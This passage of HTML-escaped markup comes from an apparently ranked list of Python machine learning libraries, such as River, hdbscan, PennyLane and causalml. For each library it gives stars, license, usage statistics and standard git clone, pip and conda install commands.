&lt;pre&gt;&lt;code&gt; git clone https://github.com/inducer/pyopencl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyopencl&#34;&gt;PyPi&lt;/a&gt; (📥 32K / month · 📦 190 · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyopencl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyopencl&#34;&gt;Conda&lt;/a&gt; (📥 600K · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyopencl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/online-ml/river&#34;&gt;River&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 3.4K) - Online machine learning in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/online-ml/river&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 77 · 🔀 380 · 📦 120 · 📋 370 - 4% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/online-ml/river&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/river&#34;&gt;PyPi&lt;/a&gt; (📥 6.4K / month · 📦 12 · ⏱️ 04.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install river&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/river&#34;&gt;Conda&lt;/a&gt; (📥 8.2K · ⏱️ 09.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge river&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/hdbscan&#34;&gt;hdbscan&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.2K) - A high performance implementation of HDBSCAN clustering. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/hdbscan&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 400 · 📦 1.4K · 📋 420 - 63% open · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/hdbscan&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hdbscan&#34;&gt;PyPi&lt;/a&gt; (📥 400K / month · 📦 150 · ⏱️ 08.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hdbscan&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hdbscan&#34;&gt;Conda&lt;/a&gt; (📥 1.1M · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hdbscan&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PennyLaneAI/pennylane&#34;&gt;PennyLane&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1.4K) - PennyLane is a cross-platform Python library for differentiable.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PennyLaneAI/pennylane&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 98 · 🔀 360 · 📥 60 · 📋 700 - 25% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PennyLaneAI/PennyLane&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pennylane&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 32 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pennylane&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pennylane&#34;&gt;Conda&lt;/a&gt; (📥 1.1K · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pennylane&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorly/tensorly&#34;&gt;tensorly&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1.2K) - TensorLy: Tensor Learning in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorly/tensorly&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 52 · 🔀 240 · 📦 260 · 📋 190 - 25% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorly/tensorly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorly&#34;&gt;PyPi&lt;/a&gt; (📥 5.1K / month · 📦 30 · ⏱️ 08.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorly&#34;&gt;Conda&lt;/a&gt; (📥 240K · ⏱️ 09.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nicodv/kmodes&#34;&gt;kmodes&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1K) - Python implementations of the k-modes and k-prototypes clustering.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nicodv/kmodes&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 370 · 📦 1.2K · 📋 150 - 10% open · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nicodv/kmodes&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kmodes&#34;&gt;PyPi&lt;/a&gt; (📥 370K / month · 📦 26 · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kmodes&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/kmodes&#34;&gt;Conda&lt;/a&gt; (📥 8.9K · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge kmodes&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/adapter-hub/adapter-transformers&#34;&gt;adapter-transformers&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 820) - Huggingface Transformers + Adapters =. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;huggingface&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/adapter-hub/adapter-transformers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.3K · 🔀 140 · 📦 75 · 📋 180 - 29% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Adapter-Hub/adapter-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/adapter-transformers&#34;&gt;PyPi&lt;/a&gt; (📥 39K / month · 📦 5 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install adapter-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/uber/causalml&#34;&gt;causalml&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 3K) - Uplift modeling and causal inference with machine learning algorithms. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/uber/causalml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 41 · 🔀 480 · 📦 50 · 📋 260 - 17% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/uber/causalml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/causalml&#34;&gt;PyPi&lt;/a&gt; (📥 47K / month · 📦 1 · ⏱️ 14.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install causalml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyjanitor-devs/pyjanitor&#34;&gt;pyjanitor&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 920) - Clean APIs for data cleaning. Python implementation of R package Janitor. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyjanitor-devs/pyjanitor&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 150 · 📦 180 · 📋 470 - 22% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyjanitor-devs/pyjanitor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyjanitor&#34;&gt;PyPi&lt;/a&gt; (📥 22K / month · 📦 11 · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyjanitor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyjanitor&#34;&gt;Conda&lt;/a&gt; (📥 120K · ⏱️ 22.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyjanitor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mars-project/mars&#34;&gt;Mars&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.4K) - Mars is a tensor-based unified framework for large-scale data.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mars-project/mars&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 45 · 🔀 300 · 📋 1.1K - 17% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mars-project/mars&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pymars&#34;&gt;PyPi&lt;/a&gt; (📥 26K / month · 📦 1 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pymars&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SeldonIO/alibi-detect&#34;&gt;alibi-detect&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.3K) - Algorithms for outlier, adversarial and drift detection. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/SeldonIO/alibi-detect&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 140 · 📦 90 · 📋 240 - 32% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/SeldonIO/alibi-detect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/alibi-detect&#34;&gt;PyPi&lt;/a&gt; (📥 28K / month · 📦 5 · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install alibi-detect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tableau/TabPy&#34;&gt;TabPy&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.3K) - Execute Python code on the fly and display results in Tableau visualizations:. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tableau/TabPy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 46 · 🔀 460 · 📦 90 · 📋 290 - 3% open · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tableau/TabPy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tabpy&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 2 · ⏱️ 20.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tabpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/tabpy-client&#34;&gt;Conda&lt;/a&gt; (📥 2.8K · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda tabpy-client&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/trevorstephens/gplearn&#34;&gt;gplearn&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.1K) - Genetic Programming in Python, with a scikit-learn inspired API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/trevorstephens/gplearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 200 · 📦 250 · 📋 190 - 17% open · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/trevorstephens/gplearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gplearn&#34;&gt;PyPi&lt;/a&gt; (📥 6.1K / month · 📦 10 · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gplearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gplearn&#34;&gt;Conda&lt;/a&gt; (📥 2.3K · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gplearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/trax&#34;&gt;Trax&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 6.9K) - Trax Deep Learning with Clear Code and Speed. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/trax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 700 · 📦 54 · 📋 210 - 41% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/trax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/trax&#34;&gt;PyPi&lt;/a&gt; (📥 4.2K / month · ⏱️ 26.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install trax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sepandhaghighi/pycm&#34;&gt;pycm&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.2K) - Multi-class confusion matrix library in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sepandhaghighi/pycm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 110 · 📦 140 · 📋 180 - 6% open · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sepandhaghighi/pycm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pycm&#34;&gt;PyPi&lt;/a&gt; (📥 36K / month · 📦 13 · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pycm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/AugLy&#34;&gt;AugLy&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 4.5K) - A data augmentations library for audio, image, text, and video. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/AugLy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 23 · 🔀 240 · 📦 36 · 📋 66 - 19% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/AugLy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/augly&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 3 · ⏱️ 28.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install augly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/metric-learn&#34;&gt;metric-learn&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.2K) - Metric learning algorithms in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn-contrib/metric-learn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 220 · 📦 200 · 📋 170 - 30% open · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn-contrib/metric-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/metric-learn&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 11 · ⏱️ 02.07.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install metric-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/metric-learn&#34;&gt;Conda&lt;/a&gt; (📥 5.7K · ⏱️ 02.07.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge metric-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ContinualAI/avalanche&#34;&gt;avalanche&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 930) - Avalanche: an End-to-End Library for Continual Learning based on PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ContinualAI/avalanche&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 56 · 🔀 150 · 📦 9 · 📋 510 - 14% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ContinualAI/avalanche&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/avalanche-lib&#34;&gt;PyPi&lt;/a&gt; (📥 700 / month · ⏱️ 16.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install avalanche-lib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ljvmiranda921/pyswarms&#34;&gt;PySwarms&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 920 · 💤) - A research toolkit for particle swarm optimization in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ljvmiranda921/pyswarms&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 43 · 🔀 290 · 📦 170 · 📋 210 - 7% open · ⏱️ 23.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ljvmiranda921/pyswarms&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyswarms&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 6 · ⏱️ 03.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyswarms&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/astroML/astroML&#34;&gt;AstroML&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 820) - Machine learning, statistics, and data mining for astronomy and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/astroML/astroML&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 280 · 📋 150 - 40% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/astroML/astroML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/astroML&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 33 · ⏱️ 01.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install astroML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/astroml&#34;&gt;Conda&lt;/a&gt; (📥 29K · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge astroml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MaxHalford/prince&#34;&gt;Prince&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 800) - Python factor analysis library (PCA, CA, MCA, MFA, FAMD). &lt;code&gt;&lt;a 